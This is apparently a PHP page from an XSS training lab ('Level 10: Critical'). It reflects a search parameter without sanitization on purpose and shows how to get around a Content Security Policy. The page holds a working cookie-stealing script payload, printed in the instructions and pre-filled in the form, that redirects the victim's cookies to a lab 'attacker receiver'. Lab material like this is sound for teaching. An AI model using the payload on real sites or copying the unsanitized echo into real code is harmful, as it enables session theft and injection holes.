<?php
require_once 'session_helper.php';

// Enforce Content Security Policy (CSP) header
// Allows inline scripts, but STRICTLY BLOCKS cross-origin connect-src / fetch / XMLHttpRequest network requests!
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'; style-src 'self' 'unsafe-inline';");

$search = isset($_GET['search']) ? $_GET['search'] : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Level 10: Critical | XSS Lab</title>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: #f1f5f9; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; }
        .box { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 650px; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.3); border-top: 5px solid #8b5cf6; }
        h1 { color: #8b5cf6; margin-top: 0; }
        code { background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #f43f5e; font-family: monospace; }
        pre { background: #0f172a; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #334155; }
        .btn { display: inline-block; background-color: #8b5cf6; color: white; padding: 10px 15px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; border: none; cursor: pointer; }
        .btn:hover { background-color: #7c3aed; }
        a.back { color: #94a3b8; text-decoration: none; display: inline-block; margin-top: 20px; }
        a.back:hover { color: #f1f5f9; }
        .status-box { background: #0f172a; padding: 15px; border-radius: 6px; border: 1px dashed #334155; margin-top: 20px; }
        .csp-banner { background: rgba(245, 158, 11, 0.1); border: 1px solid #f59e0b; padding: 12px; border-radius: 6px; color: #facc15; font-size: 0.85rem; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Level 10: Critical — CSP Bypass & Exfiltration</h1>

        <div class="csp-banner">
            🛡️ <strong>Active HTTP Response Header:</strong><br>
            <code>Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self';</code>
        </div>

        <p>This is the final challenge. The application reflects your search input directly into the page with zero sanitization. However, an enterprise <strong>Content Security Policy (CSP)</strong> is active on the server. The policy restricts network requests (<code>connect-src 'self'</code>), meaning any <code>fetch()</code> or <code>XMLHttpRequest</code> call to an external receiver domain will be blocked by the browser!</p>
        
        <h3>Source Code Snippet:</h3>
        <pre><code>&lt;?php
header("Content-Security-Policy: default-src 'self'; connect-src 'self';");
// Unsanitized reflection:
echo $_GET['search'];
?&gt;</code></pre>

        <h3>Your Goal:</h3>
        <p>Exfiltrate the victim's secret session token (<code><?php echo htmlspecialchars($_COOKIE['session_token'] ?? ''); ?></code>) to our attacker receiver (<code>cookie_receiver.php</code>). </p>
        <p>Since the CSP blocks background AJAX network requests (<code>fetch</code>), you must bypass the policy using **Top-Level Navigation Redirection** (which is not blocked by <code>connect-src</code>): <br>
        <code>&lt;script&gt;window.location.href='cookie_receiver.php?stolen='+encodeURIComponent(document.cookie);&lt;/script&gt;</code></p>

        <form action="level10.php" method="GET" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #334155;">
            <label for="search">Search Term Query:</label><br>
            <input type="text" id="search" name="search" value="&lt;script&gt;window.location.href='cookie_receiver.php?stolen='+encodeURIComponent(document.cookie);&lt;/script&gt;" style="width: 100%; padding: 10px; margin-top: 5px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white;" required><br>
            <input type="submit" value="Execute Search Reflection" class="btn">
        </form>

        <div class="status-box">
            <p style="margin: 0 0 10px 0; font-size: 0.8rem; color: #94a3b8; text-transform: uppercase;">Search Results Reflection:</p>
            <div id="results" style="color: #cbd5e1;">
                <?php 
                // VULNERABLE: Direct unsanitized output reflection
                if (!empty($search)) {
                    echo $search; 
                } else {
                    echo "Please enter a search query.";
                }
                ?>
            </div>
        </div>

        <br>
        <a href="index.php" class="back">⬅️ Back to Dashboard</a>
    </div>
</body>
</html>
